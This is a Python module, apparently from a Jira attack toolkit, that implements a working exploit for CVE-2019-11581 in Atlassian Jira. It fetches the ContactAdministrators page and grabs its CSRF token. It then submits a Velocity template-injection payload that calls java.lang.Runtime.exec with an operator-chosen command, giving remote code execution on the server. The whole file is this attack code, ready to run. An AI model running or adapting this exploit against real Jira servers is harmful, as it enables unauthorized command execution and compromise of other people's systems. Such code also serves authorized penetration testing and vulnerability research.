#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from bs4 import BeautifulSoup
from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity


class CVE201911581(Exploit):
    cve = "CVE-2019-11581"
    severity = Severity.CRITICAL
    description = "Atlassian Jira ContactAdministrators Velocity template injection leading to remote code execution (RCE)"

    def __init__(
        self,
        client,
        target,
        verbose=False,
        check_only=False,
        command="calc",
    ):
        super().__init__(client, target, verbose, check_only)

        if not re.fullmatch(r"[a-zA-Z0-9_./-]+", command):
            raise ValueError(
                "Command contains unsafe characters."
                "Allowed: a-z A-Z 0-9 _ . / -"
            )

        self.command = command

        self.base_path = (
            f"{self.target}/secure/ContactAdministrators!default.jspa"
        )
        self.post_path = (
            f"{self.target}/secure/ContactAdministrators.jspa"
        )

    def check(self) -> bool:
        """
        Vulnerability check:
        - Page loads
        - No warning banner
        - CSRF token exists
        """
        r = self.client.get(self.base_path)

        if r.status_code != 200:
            return False

        soup = BeautifulSoup(r.content, "lxml")

        if soup.find_all("div", class_="aui-message-warning"):
            return False

        token = soup.find("input", {"name": "atl_token"})
        if not token:
            return False

        # Store token for exploit stage
        self.csrf_token = token["value"]

        if self.verbose:
            print(
                Style.GREEN("[+] Found JIRA CSRF token: ")
                + Style.UNDERLINE(self.csrf_token)
            )

        return True

    def exploit(self):
        print(Style.YELLOW("[*] Executing RCE payload"))

        # TODO: base64 encode + decode in Java
        payload = (
            "$i18n.getClass().forName('java.lang.Runtime')"
            ".getMethod('getRuntime',null)"
            ".invoke(null,null)"
            f".exec('{self.command}')"
            ".waitFor()"
        )

        params = {
            "from": "JIRA@JIRA.com",
            "subject": payload,
            "details": payload,
            "atl_token": self.csrf_token,
            "Send": "Send",
        }

        r = self.client.post(
            self.post_path,
            data=params,
        )

        print(Style.GREEN("[+] Exploit request sent"))
        print(Style.MAGENTA("[*] Response:"))
        print(r)
